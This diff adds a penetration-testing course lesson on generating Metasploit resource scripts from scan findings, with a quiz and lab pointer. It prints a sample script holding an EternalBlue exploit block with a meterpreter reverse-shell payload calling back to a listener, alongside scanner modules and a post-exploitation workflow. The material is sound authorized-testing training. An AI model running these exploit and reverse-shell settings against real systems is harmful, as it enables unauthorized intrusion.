@@ -1,0 +1,230 @@
+## RC scripts — automate without losing the audit trail
+
+A Metasploit RC ("resource") file is a sequence of `msfconsole` commands. You
+pipe it in with `msfconsole -r file.rc` or `msfconsole -q -r file.rc`. The
+practical value:
+
+- **Reproducibility.** Six months later, the RC tells you exactly what you ran.
+- **Review.** RC files are plain text. A reviewer can read it without launching msf.
+- **Safety.** Generate-only by default; `--execute` is the explicit go-ahead.
+
+The SecOps toolkit's `msf-rc-gen.sh` and `msf-session.sh` both produce RC scripts
+rather than directly running msfconsole. That's the discipline — generate, read,
+then run.
+
+## From findings JSON to RC
+
+You already have a findings JSON from the active recon pipeline:
+
+```bash
+./scripts/pentest.sh acme.com 203.0.113.10
+./scripts/cve-lookup.sh --nmap-file ~/pentest-reports/*/02-nmap-realip.txt \
+    --output findings.json --engagement acme-q2
+python3 scripts/risk-scoring.py --findings findings.json --output scored.json
+```
+
+Now feed it to `msf-rc-gen.sh`:
+
+```bash
+./scripts/msf-rc-gen.sh \
+  --findings scored.json \
+  --target 203.0.113.10 \
+  --lhost 10.0.0.99 \
+  --engagement acme-q2
+```
+
+Output: one or more RC files under
+`~/assessments/acme-q2/05-exploitation/msf/` containing:
+
+1. An auxiliary scanner section for *check* modules (always safe to run)
+2. An exploit section, **commented out** by default — you uncomment after review
+
+A snippet from a typical output:
+
+```ruby
+# === Auxiliary scanners (check only — safe) ===
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 203.0.113.10
+run
+
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS 203.0.113.10
+set RPORT 443
+run
+
+# === Exploits — REVIEW BEFORE RUNNING ===
+# CVE-2017-0144 → EternalBlue SMB RCE
+# Authorization required. Confirms by uncommenting.
+# use exploit/windows/smb/ms17_010_eternalblue
+# set RHOSTS 203.0.113.10
+# set PAYLOAD windows/x64/meterpreter/reverse_tcp
+# set LHOST 10.0.0.99
+# set LPORT 4444
+# set ExitOnSession false
+# set EnableStageEncoding true
+# exploit
+```
+
+The CVE → module mapping is built in (27 mappings) — see `msf-rc-gen.sh` lines
+30-58. Service-banner mapping covers another 9 patterns where there's no CVE
+but the version is obviously vulnerable (e.g., vsftpd 2.3.4, ProFTPD 1.3.3c).
+
+## Reading the RC before running
+
+Three things to check on every generated RC:
+
+### 1. RHOSTS / RPORT correct?
+
+The script fills these from findings. If the finding listed port 8080 for
+a Tomcat exploit, `RPORT` should be 8080. Misalignment usually means the
+finding metadata was wrong — fix the finding, regenerate.
+
+### 2. Payload appropriate for target?
+
+`set PAYLOAD windows/x64/meterpreter/reverse_tcp` on a Linux target won't
+work. The script defaults to per-OS payloads when the finding has platform
+metadata; without metadata, it falls back to a sensible default which may
+be wrong. Always confirm.
+
+### 3. LHOST reachable from target?
+
+If you're scanning from `10.0.0.99` but the target is a public-facing host
+that can't route to private IPs, your handler will never get a callback.
+For external targets, LHOST is usually a public VPS you control (with its
+own authorization context — don't run msf on a cloud provider's general
+IP without checking their AUP).
+
+## Auxiliary first, exploit second
+
+The toolkit's bias is to run *check* modules first:
+
+```text
+auxiliary/scanner/smb/smb_ms17_010                 — does the SMB version match the bug?
+auxiliary/scanner/ssl/openssl_heartbleed           — does the TLS impl bleed?
+auxiliary/scanner/http/tomcat_mgr_login            — is there a tomcat-manager?
+auxiliary/admin/dcerpc/cve_2020_1472_zerologon     — is the DC vulnerable?
+```
+
+Each one returns a boolean. A "VULNERABLE" return from a scanner is dramatically
+stronger evidence than a banner version match. Run scanners; document the
+results; only then move to the exploit module.
+
+## Workspace + import flow
+
+Before running any RC, set up the workspace:
+
+```bash
+./scripts/msf-session.sh workspace --name acme-q2 --execute
+./scripts/msf-session.sh import-nmap \
+  --xml ~/assessments/acme-q2/02-active-recon/scan.xml \
+  --workspace acme-q2 --execute
+./scripts/msf-session.sh import-findings \
+  --xml ~/assessments/acme-q2/scored.json \
+  --workspace acme-q2 --execute
+```
+
+After this, msfconsole has the recon context in `hosts`, `services`, and `notes`.
+The RC scripts then run *into* that workspace, recording exploit attempts and
+captured creds alongside.
+
+## The full chain
+
+```text
+pentest.sh                  ──→ nmap output
+        │
+        ↓
+cve-lookup.sh               ──→ findings.json (CVE-tagged)
+        │
+        ↓
+risk-scoring.py             ──→ scored.json (with risk + OWASP)
+        │
+        ↓
+scan-db.py import-findings  ──→ SQLite persistence
+        │
+        ↓
+msf-session.sh import-*     ──→ msfdb workspace populated
+        │
+        ↓
+msf-rc-gen.sh --findings    ──→ RC file: aux check + commented exploits
+        │           ↓
+        │     [REVIEW]
+        │           ↓
+msfconsole -q -r <rc>       ──→ run aux checks
+        │
+        ↓
+msfvenom-gen.sh             ──→ payload + handler RC (next lesson)
+        │
+        ↓
+msf-session.sh handler      ──→ listener running
+        │
+        ↓
+msfconsole -q -r <rc>       ──→ uncommented exploit → session catches
+        │
+        ↓
+msf-post.sh --recipe ...    ──→ post-exploit work
+```
+
+Each arrow is a deliberate step. The dry-run gates between them are what
+prevent "I ran the whole thing automatically and triggered an outage."
+
+## Authorization gate inside msf-rc-gen.sh
+
+The script enforces a soft gate even before `--execute`:
+
+```bash
+./scripts/msf-rc-gen.sh --findings scored.json --target 203.0.113.10 \
+  --lhost 10.0.0.99 --engagement acme-q2
+```
+
+Generates the RC. When you actually run it via `msfconsole -r`, you're past
+the toolkit's gate — msf itself doesn't enforce authorization. The toolkit's
+position is that the human running the RC is the gate.
+
+If you're working under an ROE that says "no automated exploit chains,"
+the right path is `--findings` for the auxiliary section only, then hand-craft
+the exploit block from the SecOps reference (`data/references/metasploit-reference.md`).
+
+<Checkpoint
+  id="msf-rc-workflow"
+  questions={[
+    {
+      q: "msf-rc-gen.sh generates an RC file with exploits commented out by default. Why?",
+      options: [
+        "To save disk space",
+        "Because the operator should read and review before running anything that triggers an exploit",
+        "Because Metasploit doesn't support running exploits non-interactively",
+        "Because CVE lookups are unreliable",
+      ],
+      answer: 1,
+      why: "Generate-only-by-default is the toolkit's discipline. The RC file is reviewable plain text; the operator uncommenting an exploit is the explicit authorization act.",
+    },
+    {
+      q: "You want the SMB exploits for a target. Which run order is right?",
+      options: [
+        "exploit/windows/smb/ms17_010_eternalblue first, then auxiliary scanner",
+        "auxiliary/scanner/smb/smb_ms17_010 first — confirms the bug is actually present — then the exploit only if scanner returns VULNERABLE",
+        "Both at the same time, in parallel",
+        "Skip the scanner; banner version is sufficient",
+      ],
+      answer: 1,
+      why: "Scanner → exploit. A scanner's 'VULNERABLE' is stronger evidence than a banner. Exploits are expensive — they may crash the target if the version match was wrong.",
+    },
+    {
+      q: "You're testing a public-facing server from your home network. LHOST = your home LAN IP. The exploit triggers but no session catches. Most likely cause?",
+      options: [
+        "Wrong payload architecture",
+        "LHOST is unreachable from the target — it's a private RFC1918 IP and the target can't route to it",
+        "EnableStageEncoding was on",
+        "RHOSTS was set to a /24",
+      ],
+      answer: 1,
+      why: "For external targets, LHOST must be reachable. Usually a VPS you control with its own authorization context. Pointing at a private IP from outside is a common first-engagement mistake.",
+    },
+  ]}
+/>
+
+## Lab
+
+Lab `06-msf-lab` walks through this full chain against Metasploitable3.
+
+Next lesson: `msfvenom-gen.sh` for payload generation.
